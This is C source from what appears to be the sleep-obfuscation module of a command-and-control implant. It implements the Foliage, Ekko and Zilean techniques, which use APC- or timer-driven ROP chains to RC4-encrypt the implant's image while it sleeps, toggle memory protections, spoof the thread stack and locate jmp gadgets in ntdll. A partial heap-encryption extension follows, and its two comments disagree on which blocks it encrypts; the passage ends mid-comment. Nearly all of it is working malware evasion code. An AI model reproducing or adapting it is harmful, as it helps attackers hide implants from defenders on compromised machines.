#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/Spoof.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>

#if _WIN64

/*!
 * @brief
 *  foliage is a sleep obfuscation technique that is using APC calls
 *  to obfuscate itself in memory
 *
 * @param Param
 * @return
 */
VOID FoliageObf(
    IN PSLEEP_PARAM Param
) {
    USTRING             Key         = { 0 };
    USTRING             Rc4         = { 0 };
    UCHAR               Random[16]  = { 0 };

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = { 0 };
    PCONTEXT            RopCap      = { 0 };
    PCONTEXT            RopSpoof    = { 0 };

    PCONTEXT            RopBegin    = { 0 };
    PCONTEXT            RopSetMemRw = { 0 };
    PCONTEXT            RopMemEnc   = { 0 };
    PCONTEXT            RopGetCtx   = { 0 };
    PCONTEXT            RopSetCtx   = { 0 };
    PCONTEXT            RopWaitObj  = { 0 };
    PCONTEXT            RopMemDec   = { 0 };
    PCONTEXT            RopSetMemRx = { 0 };
    PCONTEXT            RopSetCtx2  = { 0 };
    PCONTEXT            RopExitThd  = { 0 };

    LPVOID              ImageBase   = NULL;
    SIZE_T              ImageSize   = 0;
    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
    SIZE_T              TmpValue    = 0;

    ImageBase = Instance->Session.ModuleBase;
    ImageSize = Instance->Session.ModuleSize;

    // Check if .text section is defined
    if (Instance->Session.TxtBase != 0 && Instance->Session.TxtSize != 0) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        dwProtect  = PAGE_EXECUTE_READ;
    } else {
        TxtBase = Instance->Session.ModuleBase;
        TxtSize = Instance->Session.ModuleSize;
    }

    // Generate random keys
    for ( SHORT i = 0; i < 16; i++ )
        Random[ i ] = RandomNumber32( );

    Key.Buffer = &Random;
    Key.Length = Key.MaximumLength = 0x10;

    Rc4.Buffer = ImageBase;
    Rc4.Length = Rc4.MaximumLength = ImageSize;

    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            RopInit     = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCap      = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSpoof    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopBegin    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemEnc   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopGetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopWaitObj  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemDec   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRx = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx2  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopExitThd  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( hThread, RopInit ) ) )
                {
                    MemCopy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopGetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopWaitObj,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemDec,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRx, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx2,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopExitThd,  RopInit, sizeof( CONTEXT ) );

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip  = U_PTR( Instance->Win32.NtWaitForSingleObject );
                    RopBegin->Rsp -= U_PTR( 0x1000 * 13 );
                    RopBegin->Rcx  = U_PTR( hEvent );
                    RopBegin->Rdx  = U_PTR( FALSE );
                    RopBegin->R8   = U_PTR( NULL );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRw->Rsp -= U_PTR( 0x1000 * 12 );
                    RopSetMemRw->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw->R8   = U_PTR( &ImageSize );
                    RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    RopMemEnc->ContextFlags = CONTEXT_FULL;
                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                    RopMemEnc->Rcx  = U_PTR( &Rc4 );
                    RopMemEnc->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); RC4 Encryption

                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip  = U_PTR( Instance->Win32.NtGetContextThread );
                    RopGetCtx->Rsp -= U_PTR( 0x1000 * 10 );
                    RopGetCtx->Rcx  = U_PTR( hDupObj );
                    RopGetCtx->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtGetContextThread( Src, Cap );

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                    RopSetCtx->Rcx  = U_PTR( hDupObj );
                    RopSetCtx->Rdx  = U_PTR( RopSpoof );
                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Spf );

                    // NOTE: Here is the thread sleeping...
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip  = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                    RopWaitObj->Rsp -= U_PTR( 0x1000 * 8 );
                    RopWaitObj->Rcx  = U_PTR( hDupObj );
                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                    RopWaitObj->R8   = U_PTR( FALSE );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );

                    // NOTE: thread image decryption
                    RopMemDec->ContextFlags = CONTEXT_FULL;
                    RopMemDec->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                    RopMemDec->Rcx  = U_PTR( &Rc4 );
                    RopMemDec->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); Rc4 Decryption

                    // RW -> RWX
                    RopSetMemRx->ContextFlags = CONTEXT_FULL;
                    RopSetMemRx->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRx->Rsp -= U_PTR( 0x1000 * 6 );
                    RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRx->Rdx  = U_PTR( &TxtBase );
                    RopSetMemRx->R8   = U_PTR( &TxtSize );
                    RopSetMemRx->R9   = U_PTR( dwProtect );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( & TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );

                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx2->Rsp -= U_PTR( 0x1000 * 5 );
                    RopSetCtx2->Rcx  = U_PTR( hDupObj );
                    RopSetCtx2->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Cap );

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                    RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                    RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // RtlExitUserThread( ERROR_SUCCESS );

                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;

                    if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                    {
                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                        RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers

                        // Execute every registered Apc thread
                        SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
                    }
                }
            }
            
        }
    }

Leave:
    if ( RopExitThd != NULL ) {
        Instance->Win32.LocalFree( RopExitThd );
        RopExitThd = NULL;
    }

    if ( RopSetCtx2 != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx2 );
        RopSetCtx2 = NULL;
    }

    if ( RopSetMemRx != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRx );
        RopSetMemRx = NULL;
    }

    if ( RopMemDec != NULL ) {
        Instance->Win32.LocalFree( RopMemDec );
        RopMemDec = NULL;
    }

    if ( RopWaitObj != NULL ) {
        Instance->Win32.LocalFree( RopWaitObj );
        RopWaitObj = NULL;
    }

    if ( RopSetCtx != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx );
        RopSetCtx = NULL;
    }

    if ( RopSetMemRw != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRw );
        RopSetMemRw = NULL;
    }

    if ( RopBegin != NULL ) {
        Instance->Win32.LocalFree( RopBegin );
        RopBegin = NULL;
    }

    if ( RopSpoof != NULL ) {
        Instance->Win32.LocalFree( RopSpoof );
        RopSpoof = NULL;
    }

    if ( RopCap != NULL ) {
        Instance->Win32.LocalFree( RopCap );
        RopCap = NULL;
    }

    if ( RopInit != NULL ) {
        Instance->Win32.LocalFree( RopInit );
        RopInit = NULL;
    }

    if ( hDupObj != NULL ) {
        SysNtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL ) {
        SysNtTerminateThread( hThread, STATUS_SUCCESS );
        hThread = NULL;
    }

    if ( hEvent != NULL ) {
        SysNtClose( hEvent );
        hEvent = NULL;
    }

    MemSet( &Rc4, 0, sizeof( USTRING ) );
    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    Instance->Win32.SwitchToFiber( Param->Master );
}

/*!
 * @brief
 *  ekko/zilean sleep obfuscation technique using
 *  Timers Api (RtlCreateTimer/RtlRegisterWait)
 *  with stack duplication/spoofing by duplicating the
 *  NT_TIB from another thread.
 *
 * @note
 *  this technique most likely wont work when the
 *  process is also actively using the timers api.
 *  So in future either use Veh + hardware breakpoints
 *  to create our own thread pool or leave it as it is.
 *
 * @param TimeOut
 * @param Method
 * @return
 */
BOOL TimerObf(
    _In_ ULONG TimeOut,
    _In_ ULONG Method
) {
    /* Handles */
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    HANDLE   ThdSrc    = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait  = { 0 };
    UCHAR    Buf[ 16 ] = { 0 };
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    PVOID    ImgBase   = { 0 };
    ULONG    ImgSize   = { 0 };
    CONTEXT  TimerCtx  = { 0 };
    CONTEXT  ThdCtx    = { 0 };
    CONTEXT  Rop[ 13 ] = { 0 };
    ULONG    Value     = { 0 };
    ULONG    Delay     = { 0 };
    BOOL     Success   = { 0 };
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = { 0 };
    ULONG    Inc       = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase   = { 0 };
    SIZE_T   TxtSize   = { 0 };
    ULONG    Protect   = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[]  = { 0xFF, 0xE0 };

    ImageBase = TxtBase = Instance->Session.ModuleBase;
    ImageSize = TxtSize = Instance->Session.ModuleSize;
    Protect   = PAGE_EXECUTE_READWRITE;
    JmpBypass = Instance->Config.Implant.SleepJmpBypass;

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        Protect = PAGE_EXECUTE_READ;
    }

    /* create a random key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Buf[ i ] = RandomNumber32( );
    }

    /* set specific context flags */
    ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    /* set key pointer and size */
    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof( Buf );

    /* set agent memory pointer and size */
    Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
    Img.Length = Img.MaximumLength = ImgSize = Instance->Session.ModuleSize;

    if ( Method == SLEEPOBF_EKKO ) {
        NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
    } else if ( Method == SLEEPOBF_ZILEAN ) {
        NtStatus = Instance->Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    }

    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the Timer thread based on the method used */
            if ( Method == SLEEPOBF_EKKO ) {
                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Method == SLEEPOBF_ZILEAN ) {
                NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timers thread */
                if ( Method == SLEEPOBF_EKKO ) {
                    NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Method == SLEEPOBF_ZILEAN ) {
                    NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                }

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* search for jmp instruction */
                    if ( JmpBypass )
                    {
                        /* change padding to "jmp rbx" */
                        if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                            JmpPad[ 1 ] = 0x23;
                        }

                        /* scan memory for gadget */
                        if ( ! ( JmpGadget = MmGadgetFind(
                            C_PTR( U_PTR( Instance->Modules.Ntdll ) + LDR_GADGET_HEADER_SIZE ),
                            LDR_GADGET_MODULE_SIZE,
                            JmpPad,
                            sizeof( JmpPad )
                        ) ) ) {
                            JmpBypass = SLEEPOBF_BYPASS_NONE;
                        }
                    }

                    /* at this point we can start preparing the ROPs and execute the timers */
                    for ( int i = 0; i < 13; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rip  = U_PTR( JmpGadget );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* Start of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect );
                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* Encrypt image base address */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* perform stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }

                    /* Sys032 */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect )
                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
                    Rop[ Inc ].R8  = U_PTR( Protect );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* End of Ropchain */
                    Rop[ Inc ].Rip = U_PTR( Instance->Win32.NtSetEvent );
                    OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "Rops to be executed: %d\n", Inc )

                    /* execute/queue the timers */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( Method == SLEEPOBF_EKKO ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        } else if ( Method == SLEEPOBF_ZILEAN ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "RtlRegisterWait Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        }
                    }

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    }
                } else {
                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */
    if ( Queue ) {
        Instance->Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( EvntWait ) {
        SysNtClose( EvntWait );
        EvntWait = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for ( int i = 0; i < 13; i++ ) {
        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
    }

    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    return Success;
}

#endif

/* =========================================================================
 * ARC-04: Heap encryption during sleep
 * =========================================================================
 *
 * Before the agent enters any sleep-obfuscation routine, all currently-busy
 * heap allocations on the default process heap are XOR-encrypted with a
 * fresh 16-byte per-sleep random key.  After the sleep completes the same
 * walk is performed again to reverse the XOR.  Because XOR is its own
 * inverse, HeapEncryptDecrypt() is called once to encrypt and once to
 * decrypt — no separate encrypt/decrypt flag is required.
 *
 * Only busy (allocated, user-data) blocks are touched; the heap manager's
 * own metadata and free-list entries are left intact so that heap operations
 * performed inside the sleep routine (e.g. FoliageObf's LocalAlloc calls)
 * continue to work correctly.
 *
 * The key lives on the calling thread's stack and is wiped with
 * RtlSecureZeroMemory after decryption.
 */

/*!
 * @brief
 *  XOR-crypt @p Size bytes at @p Data with the repeating @p Key.
 *
 * @param Data    Pointer to the buffer to crypt in-place.
 * @param Size    Number of bytes to process.
 * @param Key     Key bytes (must be > 0).
 * @param KeyLen  Length of Key in bytes.
 */
static VOID HeapXorBlock(
    IN OUT PUCHAR Data,
    IN     SIZE_T Size,
    IN     PUCHAR Key,
    IN     ULONG  KeyLen
) {
    for ( SIZE_T i = 0; i < Size; i++ ) {
        Data[ i ] ^= Key[ i % KeyLen ];
    }
}

/*!
 * @brief
 *  Walk the default process heap and XOR-encrypt (or decrypt) every busy
 *  allocation that carries the ARC-04 sentinel header.  Only the user-data
 *  portion past the sentinel is encrypted; the sentinel itself is left
 *  intact so the decrypt pass can still locate tagged blocks.
 *
 *  System/library allocations and heap-manager metadata lack the sentinel
 *  and are left untouched.
 *
 *  Calling this function twice with the same key restores the plaintext
 *  (XOR is its own inverse).
 *
